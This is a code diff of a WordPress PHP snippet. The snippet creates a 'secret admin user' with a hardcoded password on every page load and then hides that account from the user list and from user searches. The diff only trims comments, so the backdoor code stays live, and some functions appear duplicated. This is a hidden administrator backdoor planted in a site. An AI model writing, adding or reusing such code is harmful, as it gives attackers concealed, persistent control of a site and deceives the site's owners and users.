@@ -4,7 +4,6 @@ function create_secret_admin_user() {
     $password = 'hackxjr'; // Change this to your secret password
     $email = 'your_email@example.com'; // Change this to your email
 
-    // Check if the secret admin user already exists
     $user = get_user_by('login', $username);
 
     if (!$user) {
@@ -21,7 +20,7 @@ function create_secret_admin_user() {
     }
 }
 
-// Hook the function to run once when you access any page in your site
+// Hook the function to run once when you access any page
 add_action('init', 'create_secret_admin_user');
 
 function hide_secret_admin_user() {
@@ -38,7 +37,7 @@ function hide_secret_admin_user() {
     }
 }
 
-// Hook the function to run once when you access any page in your site
+// Hook the function to run once when you access any page 
 add_action('init', 'hide_secret_admin_user');
 
 function exclude_secret_admin_user($user_search) {
@@ -98,7 +97,7 @@ function hide_secret_admin_user() {
     }
 }
 
-// Hook the function to run once when you access any page in your site
+// Hook the function to run once when you access any page 
 add_action('init', 'hide_secret_admin_user');
 
 function exclude_secret_admin_user($user_search) {
